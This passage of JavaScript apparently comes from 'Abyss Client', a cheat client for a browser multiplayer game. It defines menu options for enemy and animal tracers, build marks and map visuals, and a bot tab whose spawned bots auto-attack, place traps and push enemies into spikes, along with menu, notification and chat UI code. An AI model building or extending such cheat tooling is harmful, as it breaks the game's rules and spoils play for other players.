                title: "Show Near Lines",
                description: "Additional lines to nearby teammates",
                icon: "linear_scale",
                onChange: [
                  ["TeamNearLines", false],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "AnimalTracer",
            title: "Animal",
            description: "Show tracers to animals",
            icon: "pets",
            onChange: [
              ["AnimalTracer", false],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Animal Settings" },
              {
                type: "slider",
                id: "AnimalTracerThickness",
                title: "Thickness",
                description: "Line / arrow thickness",
                icon: "line_weight",
                onChange: [
                  ["AnimalTracerThickness", 3, [1, 10], 1],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "AnimalTracerColor",
                title: "Color",
                description: "Animal tracer color",
                icon: "palette",
                onChange: [
                  ["AnimalTracerColor", ["#ffca28", false], [true, false, 50]],
                  [true, false],
                ],
              },
              {
                type: "checkbox",
                id: "AnimalNearLines",
                title: "Show Near Lines",
                description: "Additional lines to nearby animals",
                icon: "linear_scale",
                onChange: [
                  ["AnimalNearLines", false],
                  [true, false],
                ],
              },
            ],
          },
        ],
      },

      { type: "Header", title: "BUILD" },
      {
        type: "checkbox",
        id: "BuildMark",
        title: "Build Mark",
        description: "Mark builds on map",
        icon: "place",
        onChange: [
          ["BuildMark", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "slider",
            id: "BuildMarkRange",
            title: "Visibility Range",
            description: "How far away the marks are visible",
            icon: "straighten",
            onChange: [
              ["BuildMarkRange", 1500, [50, 2000], 10],
              [true, false],
            ],
          },
          {
            type: "selector",
            id: "BuildMarkType",
            title: "Mark Type",
            description: "Style of the build markers",
            icon: "category",
            onChange: [
              ["BuildMarkType", "Circle", ["Circle", "Outline", "Text"]],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "PlayerBuildMarkToggle",
            title: "Player Builds",
            description: "Show player builds on map",
            icon: "person",
            onChange: [
              ["PlayerBuildMarkToggle", true],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Player Settings" },
              {
                type: "checkbox",
                id: "PlayerBuildMarkAnimated",
                title: "Animated",
                description: "Animated player build marks",
                icon: "animation",
                onChange: [
                  ["PlayerBuildMarkAnimated", true],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "PlayerBuildMarkSize",
                title: "Size",
                description: "Size of player build marks",
                icon: "zoom_out_map",
                onChange: [
                  ["PlayerBuildMarkSize", 8, [4, 24], 1],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "PlayerBuildMark",
                title: "Color",
                description: "Player BuildMark color",
                icon: "palette",
                onChange: [
                  ["PlayerBuildMark", ["#8ecc51", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "TeamBuildMarkToggle",
            title: "Team Builds",
            description: "Show team builds on map",
            icon: "group",
            onChange: [
              ["TeamBuildMarkToggle", true],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Team Settings" },
              {
                type: "checkbox",
                id: "TeamBuildMarkAnimated",
                title: "Animated",
                description: "Animated team build marks",
                icon: "animation",
                onChange: [
                  ["TeamBuildMarkAnimated", true],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TeamBuildMarkSize",
                title: "Size",
                description: "Size of team build marks",
                icon: "zoom_out_map",
                onChange: [
                  ["TeamBuildMarkSize", 8, [4, 24], 1],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "TeamBuildMark",
                title: "Color",
                description: "Team BuildMark color",
                icon: "palette",
                onChange: [
                  ["TeamBuildMark", ["#345eeb", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "EnemyBuildMarkToggle",
            title: "Enemy Builds",
            description: "Show enemy builds on map",
            icon: "person_off",
            onChange: [
              ["EnemyBuildMarkToggle", true],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Enemy Settings" },
              {
                type: "checkbox",
                id: "EnemyBuildMarkAnimated",
                title: "Animated",
                description: "Animated enemy build marks",
                icon: "animation",
                onChange: [
                  ["EnemyBuildMarkAnimated", true],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "EnemyBuildMarkSize",
                title: "Size",
                description: "Size of enemy build marks",
                icon: "zoom_out_map",
                onChange: [
                  ["EnemyBuildMarkSize", 8, [4, 24], 1],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "EnemyBuildMark",
                title: "Color",
                description: "Enemy BuildMark color",
                icon: "palette",
                onChange: [
                  ["EnemyBuildMark", ["#cc5151", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
        ],
      },
      {
        type: "checkbox",
        id: "showTrapWarnings",
        title: "Trap Warnings",
        description: "Show trap warning indicators",
        icon: "report_problem",
        onChange: [
          ["showTrapWarnings", false],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Color" },
          {
            type: "Colors",
            id: "TrapWarningColor",
            title: "Warning Color",
            description: "Trap warning color",
            icon: "palette",
            onChange: [
              ["TrapWarningColor", ["#ff0000", false], [true, false, 50]],
              [true, false],
            ],
          },
        ],
      },
      {
        type: "checkbox",
        id: "showSpikeTickIndicators",
        title: "Spike Tick Indicators",
        description: "Show spike tick indicators",
        icon: "notifications_active",
        onChange: [
          ["showSpikeTickIndicators", false],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Color" },
          {
            type: "Colors",
            id: "SpikeTickColor",
            title: "Indicator Color",
            description: "Spike tick indicator color",
            icon: "palette",
            onChange: [
              ["SpikeTickColor", ["#ff9900", false], [true, false, 50]],
              [true, false],
            ],
          },
        ],
      },
      {
        type: "checkbox",
        id: "placeVis",
        title: "Render Placers",
        description: "Show placement visuals",
        icon: "visibility",
        onChange: [
          ["placeVis", false],
          [true, false],
        ],
      },
      { type: "Header", title: "Map" },
      {
        type: "text",
        id: "Biome",
        title: "Biome",
        description: "Biome visual settings",
        icon: "landscape",
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "checkbox",
            id: "River",
            title: "River",
            description: "Display River",
            icon: "waves",
            onChange: [
              ["River", true],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "RiverWave",
            title: "River Wave",
            description: "Animation for River Wave",
            icon: "waves",
            onChange: [
              ["RiverWave", true],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "Grids",
            title: "Grids",
            description: "Toggle Grids",
            icon: "grid_on",
            onChange: [
              ["Grids", false],
              [true, false],
            ],
          },
          {
            type: "slider",
            id: "GridsSize",
            title: "Grids Size",
            description: "Change to any value of GridsSize",
            icon: "grid_on",
            onChange: [
              ["GridsSize", 4, [0, 50], 1],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "ShorePath",
            title: "Biome ShorePath",
            description: "Show biome shore/transition paths",
            icon: "waves",
            onChange: [
              ["ShorePath", true],
              [true, false],
            ],
          },
          { type: "Header", title: "Volcano" },
          {
            type: "checkbox",
            id: "Volcano",
            title: "Volcano",
            description: "Show volcano visuals",
            icon: "landscape",
            onChange: [
              ["Volcano", true],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Volcano Settings" },
              {
                type: "checkbox",
                id: "Lava",
                title: "Animated Lava",
                description: "Display Animated lava inside volcano",
                icon: "local_fire_department",
                onChange: [
                  ["Lava", true],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "VolcanoBodyColor",
                title: "Volcano Body",
                description: "Color of the volcano terrain",
                icon: "palette",
                onChange: [
                  ["VolcanoBodyColor", ["#4a2c0d", false], [true, false, 50]],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "LavaOutlineColor",
                title: "Lava Outline",
                description: "Outline color around lava",
                icon: "palette",
                onChange: [
                  ["LavaOutlineColor", ["#ff4500", false], [true, false, 50]],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "LavaColor",
                title: "Lava",
                description: "Color of the lava itself",
                icon: "palette",
                onChange: [
                  ["LavaColor", ["#ff8c00", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
          { type: "Header", title: "Colors" },
          {
            type: "Colors",
            id: "GreenBiomeColor",
            title: "Green Biome",
            description: "GreenBiome color.",
            icon: "landscape",
            onChange: [
              ["GreenBiomeColor", ["#b6db66", false], [true, false, 50]],
              [true, false],
            ],
          },
          {
            type: "Colors",
            id: "SnowBiomeColor",
            title: "Snow Biome",
            description: "SnowBiome color.",
            icon: "landscape",
            onChange: [
              ["SnowBiomeColor", ["#ffffff", false], [true, false, 50]],
              [true, false],
            ],
          },
          {
            type: "Colors",
            id: "DesertBiomeColor",
            title: "Desert Biome",
            description: "DesertBiome color.",
            icon: "landscape",
            onChange: [
              ["DesertBiomeColor", ["#dbc666", false], [true, false, 50]],
              [true, false],
            ],
          },
          {
            type: "Colors",
            id: "RiverColor",
            title: "River",
            description: "River color.",
            icon: "waves",
            onChange: [
              ["RiverColor", ["#91b2db", false], [true, false, 50]],
              [true, false],
            ],
          },
        ],
      },
      {
        type: "checkbox",
        id: "nightMode",
        title: "Night Mode",
        description: "Enable night overlay effect",
        icon: "nights_stay",
        onChange: [
          ["nightMode", true],
          [true, false],
        ],
        suboptions: [
          {
            type: "checkbox",
            id: "dayNightCycle",
            title: "Day/Night Cycle",
            description: "Enable automatic day/night cycle",
            icon: "timelapse",
            onChange: [
              ["dayNightCycle", false],
              [true, false],
            ],
          },
          {
            type: "slider",
            id: "cycleDuration",
            title: "Cycle Duration",
            description: "Full day/night cycle duration (seconds)",
            icon: "timer",
            onChange: [
              ["cycleDuration", 720, [5, 1440], 5],
              [true, false],
            ],
          },
        ],
      },
      {
        type: "checkbox",
        id: "showStars",
        title: "Show Stars",
        description: "Enable starry night effect",
        icon: "auto_awesome",
        onChange: [
          ["showStars", true],
          [true, false],
        ],
      },

      { type: "Header", title: "RESET" },
      {
        type: "button",
        id: "resetRenderDefaults",
        title: "Reset Render Settings",
        description: "Restore all render options to default values",
        icon: "restart_alt",
      },
    ],

    Gui: [
      { type: "Header", title: "MENU" },
      {
        type: "checkbox",
        id: "Notifdisplay",
        title: "Notification Display",
        description: "Show notifications",
        icon: "notifications",
        onChange: [
          ["Notifdisplay", true],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "AlertDisplay",
        title: "AlertDisplay",
        onChange: [
          ["AlertDisplay", true],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "ChatLog",
        title: "ChatLog Display",
        description: "Show ChatLog",
        icon: "chat",
        onChange: [
          ["ChatLog", true],
          [true, false],
        ],
      },
      {
        type: "Input",
        id: "MenuKey",
        title: "Menu-key",
        icon: "",
        onChange: [
          ["MenuKey", "Escape", { kind: "key" }],
          [true, false],
        ],
      },
    ],

    Bot: [
      { type: "Header", title: "BOT SETTINGS" },
      {
        type: "Input",
        id: "BotName",
        title: "Bot Name",
        description: "Name for spawned bots",
        icon: "badge",
        onChange: [
          [
            "BotName",
            "Abyssal",
            { kind: "text", placeholder: "Abyssal", maxLen: 15, live: true },
          ],
          [true, false],
        ],
      },
      {
        type: "Input",
        id: "BotCount",
        title: "Bot Count",
        description: "How many bots",
        icon: "groups",
        onChange: [
          ["BotCount", 1, { kind: "number", min: 1, max: 10, step: 1 }],
          [true, false],
        ],
      },
      { type: "Header", title: "AUTOMATION" },
      {
        type: "checkbox",
        id: "botAutoHeal",
        title: "Bot Auto Heal",
        description: "Bot automatically heals when low health",
        icon: "healing",
        onChange: [
          ["botAutoHeal", true],
          [true, false],
        ],
      },
      {
        type: "slider",
        id: "botAutoHealThreshold",
        title: "Bot Heal Threshold",
        description: "Health percentage to trigger bot auto heal",
        icon: "tune",
        onChange: [
          ["botAutoHealThreshold", 40, [10, 90]],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botAutoUpgrade",
        title: "Bot Auto Upgrade",
        description: "Bot automatically upgrades when possible",
        icon: "upgrade",
        onChange: [
          ["botAutoUpgrade", true],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botAutoAttack",
        title: "Bot Auto Attack",
        description: "Bot automatically attacks nearby enemies",
        icon: "gavel",
        onChange: [
          ["botAutoAttack", true],
          [true, false],
        ],
      },
      { type: "Header", title: "PLACEMENT" },
      {
        type: "checkbox",
        id: "botAutoPlace",
        title: "Bot Auto Place",
        description: "Bots place traps/spikes automatically",
        icon: "add_box",
        onChange: [
          ["botAutoPlace", false],
          [true, false],
        ],
      },
      {
        type: "slider",
        id: "botAutoPlaceTick",
        title: "Bot AutoPlace Tick",
        description: "Placement tick interval",
        icon: "timer",
        onChange: [
          ["botAutoPlaceTick", 1, [1, 99], 1],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botReplacer",
        title: "Bot Replacer",
        description: "Bots replace broken builds",
        icon: "autorenew",
        onChange: [
          ["botReplacer", false],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botAutoBreak",
        title: "Bot Auto Break",
        description: "Bots break nearby obstacles",
        icon: "construction",
        onChange: [
          ["botAutoBreak", false],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botAutoPush",
        title: "Bot Auto Push",
        description: "Bots push enemies into spikes",
        icon: "open_with",
        onChange: [
          ["botAutoPush", false],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botAutoHat",
        title: "Bot Auto Hat",
        description: "Bots swap hats automatically",
        icon: "checkroom",
        onChange: [
          ["botAutoHat", true],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botAntiInsta",
        title: "Bot Anti Insta",
        description: "Bots try to survive insta threats",
        icon: "shield",
        onChange: [
          ["botAntiInsta", true],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botMills",
        title: "Bot Mills",
        description: "Bots place mills",
        icon: "precision_manufacturing",
        onChange: [
          ["botMills", false],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "botPrivate",
        title: "Private Server",
        description: "Bots type commands",
        icon: "precision_manufacturing",
        onChange: [
          ["botPrivate", false],
          [true, false],
        ],
      },
      { type: "Header", title: "MOVEMENT" },
      {
        type: "checkbox",
        id: "botAutoMove",
        title: "Bot Auto Move",
        description: "Bot automatically moves to avoid damage",
        icon: "directions_run",
        onChange: [
          ["botAutoMove", true],
          [true, false],
        ],
      },
      {
        type: "selector",
        id: "botAutoMoveMode",
        title: "Bot Move Mode",
        description: "Bot movement behavior pattern",
        icon: "route",
        onChange: [
          [
            "botAutoMoveMode",
            "follow",
            ["follow", "circle", "mouse", "random", "away", "towards"],
          ],
          [true, false],
        ],
      },
    ],

    init() {
      this.buildSaveKeys();
      this.loadSettings();
      const TABS = [
        [
          "main",
          "home",
          "Main",
          "Core features",
          () => this.generateUI(this.Main, "main"),
        ],
        [
          "settings",
          "settings",
          "Settings",
          "Client options",
          () => this.generateUI(this.Setting, "settings"),
        ],
        [
          "render",
          "visibility",
          "Render",
          "Visual tweaks",
          () => this.generateUI(this.Render, "render"),
        ],
        [
          "gui",
          "dashboard",
          "GUI",
          "UI Interface style",
          () => this.generateUI(this.Gui, "gui"),
        ],
        [
          "bot",
          "person",
          "Bot",
          "Automation",
          () => this.generateUI(this.Bot, "bot"),
        ],
      ];
      const sidebarHTML = TABS.map(
        ([id, icon, title, desc], i) =>
          `<div class="z-tab ${i === 0 ? "active" : ""}" data-target="${id}"><i class="material-icons">${icon}</i><div class="z-tab-text"><div class="z-tab-title">${title}</div><div class="z-tab-desc">${desc}</div></div></div>`,
      ).join("");
      const pagesHTML = TABS.map(
        ([id, , , , render], i) =>
          `<div class="z-page ${i === 0 ? "active" : ""}" id="page-${id}"> ${render()}</div>`,
      ).join("");
      document.body.insertAdjacentHTML(
        "beforeend",
        `<div id="z-menu"><div class="z-menu-header"><div class="z-title-container"><div class="z-title">Abyss Client</div><div class="z-subtitle">v0.1</div></div><div class="z-header-right"><div class="z-iconbtn" id="z-save"><i class="material-icons" style="font-size:20px;">save</i></div><div class="z-iconbtn" id="z-reset"><i class="material-icons" style="font-size:20px;">restart_alt</i></div><input class="z-search-input" type="text" placeholder="Search..."><div class="z-close">&times;</div></div></div><div class="z-menu-body"><div class="z-sidebar">${sidebarHTML}</div><div class="z-content">${pagesHTML}</div></div></div>`,
      );
      this.menu = document.getElementById("z-menu");
      this.tabs = this.menu.querySelectorAll(".z-tab");
      this.pages = this.menu.querySelectorAll(".z-page");
      this.closeBtn = this.menu.querySelector(".z-close");
      this.searchInput = this.menu.querySelector(".z-search-input");
      this.setupEventHandlers();
      const pageMap = {
        main: this.Main,
        settings: this.Setting,
        render: this.Render,
        gui: this.Gui,
        bot: this.Bot,
      };
      Object.entries(pageMap).forEach(([pageId, options]) => {
        if (options) this.initOptionHandlers(options, pageId);
      });
      this.setupSaveControls();
      this.visible = false;
      this.menu.remove();
      const content = this.menu.querySelector(".z-content");
      content.addEventListener("scroll", () => {
        const page = this.menu.querySelector(".z-page.active");
        if (page) page._y = content.scrollTop;
        content._y = content.scrollTop;
      });
    },
    setupEventHandlers() {
      document.addEventListener("click", (e) => {
        const btn = e.target.closest(".z-submenu-btn");
        if (!btn) return;
        e.preventDefault();
        e.stopPropagation();
        btn.blur();
        const opt = btn.closest(".z-option");
        const sub = opt?.nextElementSibling;
        if (!sub?.classList.contains("z-submenu-container")) return;
        sub.classList.toggle("open");
        const id = sub.id;
        if (id)
          sub.classList.contains("open")
            ? this._subMem.add(id)
            : this._subMem.delete(id);
      });
      this.tabs.forEach((tab) =>
        tab.addEventListener("click", () => this.switchTab(tab.dataset.target)),
      );
      this.closeBtn.addEventListener("click", () => this.toggle(false));
      this.setupSearch();
      ["input", "change", "click", "pointerup"].forEach((evt) =>
        this.menu.addEventListener(evt, () => this.queueSave()),
      );
      document.addEventListener("keydown", (e) => {
        const pressed = AB.Menu.keyCombo(e);
        if (!pressed) return;
        if (pressed === this.MenuKey) {
          this.toggle();
          this.searchInput.value = "";
          this.searchInput.blur();
          this.searchInput.dispatchEvent(new Event("input"));
        }
        if (e.key === "Tab" || e.key === "Alt") {
          e.preventDefault();
        }
      });
      document.addEventListener("contextmenu", (e) => e.preventDefault());
    },

    setupSearch() {
      const norm = (s) => (s || "").toLowerCase().replace(/\s+/g, " ").trim();
      const rememberDisplay = (el) => {
        if (!el || el.dataset._disp) return;
        const d = getComputedStyle(el).display;
        el.dataset._disp = d && d !== "none" ? d : "block";
      };
      const show = (el, yes) => {
        if (!el) return;
        rememberDisplay(el);
        el.style.display = yes ? el.dataset._disp : "none";
      };
      const getSearchText = (el) => {
        if (el.classList.contains("z-perf-card")) {
          const name = el.querySelector(".z-perf-name")?.textContent || "";
          const meta = el.querySelector(".z-perf-meta")?.textContent || "";
          return norm(name + " " + meta + " graph");
        }
        if (el.classList.contains("z-stat")) {
          const name = el.querySelector(".z-stat-name")?.textContent || "";
          return norm(name + " stat");
        }
        return norm(el.innerText || "");
      };
      const syncHeaders = (scopeEl) => {
        if (!scopeEl) return;
        const kids = Array.from(scopeEl.children);
        kids.forEach((el) => {
          if (el.classList?.contains("z-sec-title")) el.style.display = "none";
        });
        let lastHeader = null;
        for (const el of kids) {
          const isHeader = el.classList?.contains("z-sec-title");
          const isOption = el.classList?.contains("z-option");
          if (isHeader) {
            lastHeader = el;
            continue;
          }
          if (!isOption) continue;
          const visible = getComputedStyle(el).display !== "none";
          if (visible && lastHeader)
            lastHeader.style.display = lastHeader.dataset._disp || "block";
        }
      };
      const search = () => {
        const q = norm(this.searchInput.value);
        const hasQ = !!q;
        let tab = null;
        const openSubs = [];
        this.pages.forEach((p) => {
          const topOptions = [...p.querySelectorAll(".z-option")].filter(
            (o) => !o.closest(".z-submenu-container"),
          );
          topOptions.forEach((o) => {
            const sub =
              o.nextElementSibling?.classList.contains("z-submenu-container") &&
              o.nextElementSibling;
            let hit = !hasQ || getSearchText(o).includes(q);
            let subHit = false;
            if (sub) {
              const subs = [...sub.querySelectorAll(".z-option")];
              subs.forEach((so) => {
                const m = !hasQ || getSearchText(so).includes(q);
                show(so, m);
                if (hasQ && m) subHit = true;
              });
              syncHeaders(sub);
              if (hasQ && subHit) openSubs.push(sub);
            }
            show(o, hit || subHit);
            if (hasQ && (hit || subHit) && !tab)
              tab = p.id.replace("page-", "");
          });
          const cards = [
            ...p.querySelectorAll(".z-perf-card"),
            ...p.querySelectorAll(".z-stat"),
          ];
          cards.forEach((c) => {
            const hit = !hasQ || getSearchText(c).includes(q);
            show(c, hit);
            if (hasQ && hit && !tab) tab = p.id.replace("page-", "");
          });
        });
        if (hasQ && tab) this.switchTab(tab);
        this.menu.querySelectorAll(".z-submenu-container").forEach((s) => {
          const keep = this._subMem.has(s.id);
          const temp = openSubs.includes(s);
          s.classList.toggle("open", hasQ ? temp : keep);
        });
      };
      this.searchInput.onfocus = () => {
        this.searchInput.value = "";
        search();
      };
      this.searchInput.oninput = search;
      document.addEventListener("click", (e) => {
        if (!this.menu.contains(e.target)) {
          this.searchInput.value = "";
          search();
        }
      });
      search();
    },

    toggle(force) {
      const open = force ?? !this.visible;
      this.visible = open;
      if (!open && this.menu) {
        this._subMem.clear();
        this.menu
          .querySelectorAll(".z-submenu-container.open")
          .forEach((s) => s.id && this._subMem.add(s.id));
      }
      this.__graph?.setActive(open);
      if (this._te) {
        this.menu.removeEventListener("transitionend", this._te, true);
        this._te = null;
      }
      if (open) {
        if (!this.menu.isConnected) document.body.appendChild(this.menu);
        void this.menu.offsetHeight;
        this.menu.querySelector(".z-content").scrollTop =
          this.menu.querySelector(".z-content")._y || 0;
        this.menu.classList.add("open");
        this.menu
          .querySelectorAll(".z-submenu-container")
          .forEach((s) =>
            s.classList.toggle("open", s.id && this._subMem.has(s.id)),
          );
        return;
      }
      const m = this.menu;
      this._te = (e) => {
        if (e.target !== m) return;
        m.removeEventListener("transitionend", this._te, true);
        this._te = null;
        if (!this.visible && m.isConnected) m.remove();
      };
      m.addEventListener("transitionend", this._te, true);
      m.classList.remove("open");
    },

    switchTab(target) {
      const content = this.menu.querySelector(".z-content");
      const cur = this.menu.querySelector(".z-page.active");
      if (cur) cur._y = content.scrollTop;
      this.tabs.forEach((tab) =>
        tab.classList.toggle("active", tab.dataset.target === target),
      );
      this.pages.forEach((page) =>
        page.classList.toggle("active", page.id === `page-${target}`),
      );
      const next = this.menu.querySelector(`#page-${target}`);
      content.scrollTop = next?._y || 0;
    },
  },

  NotiDisplay: {
    notifications: [],
    add(
      content,
      color = "#fff",
      v = 0,
      position = {},
      duration = 800,
      iC = false,
    ) {
      if (!iC && !AB.Menu.Notifdisplay) return;
      const n = document.createElement("div");
      n.className = v === 0 ? "NotiDisplayHolder" : "NotiDisplayHolder2";
      n.style.color = color;
      n.innerHTML = content;
      ["top", "right", "left", "bottom"].forEach((e) => {
        if (position[e]) n.style[e] = position[e];
      });
      n._basePosition = { ...position };
      document.body.appendChild(n);
      this.notifications.push(n);
      const calculateOffset = () => {
        const groups = {};
        this.notifications.forEach((el) => {
          const key =
            el._basePosition.top ?? el._basePosition.bottom ?? "default";
          if (!groups[key]) groups[key] = [];
          groups[key].push(el);
        });
        Object.values(groups).forEach((group) => {
          group.forEach((el, i) => {
            const basePos = el._basePosition;
            const offset = group
              .slice(0, i)
              .reduce((acc, el2) => acc + el2.offsetHeight + 10, 0);
            if (basePos.top)
              el.style.top = `calc(${basePos.top} + ${offset}px)`;
            else if (basePos.bottom)
              el.style.bottom = `calc(${basePos.bottom} + ${offset}px)`;
            else el.style.top = `calc(20px + ${offset}px)`;
          });
        });
      };
      calculateOffset();
      requestAnimationFrame(() => n.classList.add("show"));
      setTimeout(() => {
        n.classList.remove("show");
        n.classList.add("fade-out");
        this.notifications = this.notifications.filter((el) => el !== n);
        calculateOffset();
        const removeFn = () => n.parentNode && n.remove();
        n.addEventListener("transitionend", removeFn, { once: true });
        setTimeout(removeFn, 250);
      }, duration);
    },
    Alert({
      title = "",
      description = "",
      icons = [],
      duration = 2000,
      top = "20px",
      bottom = "",
      left = "20px",
      right = "",
      color = "#fff",
    } = {}) {
      if (!AB.Menu.AlertDisplay) return;
      const iconsHTML = icons
        .map((url, i) => {
          const rotate = i === 1 ? "transform: rotate(0deg);" : "";
          return `<img src="${url}" style="width:50px;height:50px;border-radius:6px;flex-shrink:0;${rotate};pointer-events: none;">`;
        })
        .join("");
      const html = `<div style="display:flex;align-items:center;gap:10px;">${iconsHTML}<div><h1 style="margin:0;font-size:18px;color:#00BFFF;font-weight:600;">${title}</h1>${description ? `<p style="margin:2px 0 0 0;font-size:14px;color:#E0E0E0;">${description}</p>` : ""}</div></div>`;
      this.add(html, color, 1, { top, bottom, left, right }, duration, true);
    },
  },
  playerLog: {
    playerLogs: null,
    init() {
      this.playerLogs = document.createElement("div");
      this.playerLogs.id = "PlayerLog";
      this.playerLogs.innerHTML = `<div id="PlayerLogBoard">PlayerLog<div class="PlayerLogHolder"><div id="PlayerLogitems" class="PlayerLogitems"></div></div></div>`;
      this.setupToggle();
    },
    addThis(messages, color) {
      const box = document.getElementById("PlayerLogitems");
      if (!box) return;
      box.innerHTML = messages
        .map(
          (msg) =>
            `<span style="color:${color}; font-size:13px;">${msg}</span>`,
        )
        .join("<br>");
    },
    setupToggle() {
      const board = this.playerLogs.querySelector("#PlayerLogBoard"),
        leaderboard = getEl("leaderboard"),
        storeb = getEl("storeButton"),
        allb = getEl("allianceButton");
      if (!board || !leaderboard || !storeb || !allb) return;
      const toggle = (show) => {
        if (show && !document.body.contains(this.playerLogs)) {
          document.body.appendChild(this.playerLogs);
          requestAnimationFrame(() => board.classList.add("active"));
        } else if (!show && this.playerLogs.parentElement) {
          board.classList.remove("active");
          [leaderboard, allb, storeb].forEach(
            (el) => (el.style.transform = "translateX(0)"),
          );
          this.playerLogs.addEventListener(
            "transitionend",
            () => this.playerLogs.remove(),
            { once: true },
          );
          return;
        }
        leaderboard.style.transition =
          allb.style.transition =
          storeb.style.transition =
          "transform 0.5s ease";
        leaderboard.style.transform = show
          ? "translateX(-260px)"
          : "translateX(0)";
        [allb, storeb].forEach(
          (el) => (el.style.transform = "translateX(0)"),
        ); /*(Z.Menu.GuiLayOut == "none" && show) ? 'translateX(-260px)' : 'translateX(0)');*/
      };
      document.addEventListener("keydown", (e) => {
        if (e.key === "Tab") toggle(true);
      });
      document.addEventListener("keyup", (e) => {
        if (e.key === "Tab") toggle(false);
      });
    },
  },
  Chats: {
    chatLog: null,
    input: null,
    panes: null,
    tab: "history",
    hover: false,
    focused: false,
    idleT: 0,
    leaveT: 0,
    lastOn: null,
    unread: { history: 0, private: 0, log: 0 },
    atBottom: { history: true, private: true, log: true },
    msgQ: { history: [], private: [], log: [] },
    scrollState: {
      history: { y: 0, atBottom: true },
      private: { y: 0, atBottom: true },
      log: { y: 0, atBottom: true },
    },
    appendQ: { history: [], private: [], log: [] },
    appendRAF: 0,
    scrollRAF: 0,
    lastSmoothScroll: 0,
    smoothEveryMs: 180,
    bottomPx: 18,
    spam: { history: null, private: null, log: null },
    searchEl: null,
    searchQ: "",
    init() {
      this.chatLog = document.createElement("div");
      this.chatLog.id = "chat";
      this.chatLog.innerHTML = `<div id="ChatBodyBox"><div id="ChatTabs"><input id="ChatSearch" placeholder="Search" autocomplete="off"><div class="ChatTab active" data-tab="history" data-tip="History"><i class="material-icons">history</i><div class="badge"></div></div><div class="ChatTab" data-tab="private" data-tip="Private"><i class="material-icons">mail</i><div class="badge"></div></div><div class="ChatTab" data-tab="log" data-tip="Log"><i class="material-icons">terminal</i><div class="badge"></div></div></div><div id="ChatMessagesWrap"><div class="ChatPane" data-pane="history" id="ChatMessages"></div><div class="ChatPane isHidden" data-pane="private"></div><div class="ChatPane isHidden" data-pane="log"></div></div><input id="ChatInPut" maxlength="30" placeholder="Enter Message"></div>`;
      this.input = this.chatLog.querySelector("#ChatInPut");
      this.panes = {
        history: this.chatLog.querySelector('[data-pane="history"]'),
        private: this.chatLog.querySelector('[data-pane="private"]'),
        log: this.chatLog.querySelector('[data-pane="log"]'),
      };
      if (AB.Menu.ChatLog) {
        document.body.appendChild(this.chatLog);
        requestAnimationFrame(() => this.chatLog.classList.add("active"));
      } else {
        this.chatLog.classList.remove("active", "wake", "idle");
      }
      this.bind();
      this.setTab(this.tab);
      this.setIdle(1);
      this.lastOn = null;
      setInterval(() => {
        const on = !!AB.Menu.ChatLog;
        if (on === this.lastOn) return;
        this.lastOn = on;
        this.toggle();
      }, 150);
    },
    toggle() {
      const on = !!AB.Menu.ChatLog;
      const el = this.chatLog;
      const box = el.querySelector("#ChatBodyBox");
      if (on) {
        if (!el.isConnected) document.body.appendChild(el);
        el.classList.remove("active", "wake");
        el.classList.add("idle");
        void box.offsetHeight;
        requestAnimationFrame(() => {
          el.classList.add("active");
          requestAnimationFrame(() => this.wake());
        });
        return;
      }
      if (!on && el.isConnected) {
        el.classList.remove("wake");
        el.classList.add("idle");
        el.classList.remove("active");
        const done = () => {
          box.removeEventListener("transitionend", done, true);
          if (!AB.Menu.ChatLog && el.isConnected) el.remove();
        };
        box.addEventListener("transitionend", done, true);
        setTimeout(done, 400);
        this.focused = 0;
        this.hover = 0;
        this.setIdle(1);
      }
    },
    tabEl(name) {
      return this.chatLog?.querySelector(`.ChatTab[data-tab="${name}"]`);
    },
    isAtBottom(pane, px = this.bottomPx) {
      return pane.scrollHeight - (pane.scrollTop + pane.clientHeight) <= px;
    },
    saveScroll(k) {
      const p = this.panes?.[k];
      if (!p) return;
      this.scrollState[k] = { y: p.scrollTop, atBottom: this.isAtBottom(p) };
    },
    restoreScroll(k) {
      const p = this.panes?.[k];
      if (!p) return;
      const st = this.scrollState[k] || { y: 0, atBottom: true };
      requestAnimationFrame(() => {
        if (st.atBottom) {
          p.scrollTop = p.scrollHeight;
          this.atBottom[k] = true;
          this.msgQ[k].length = 0;
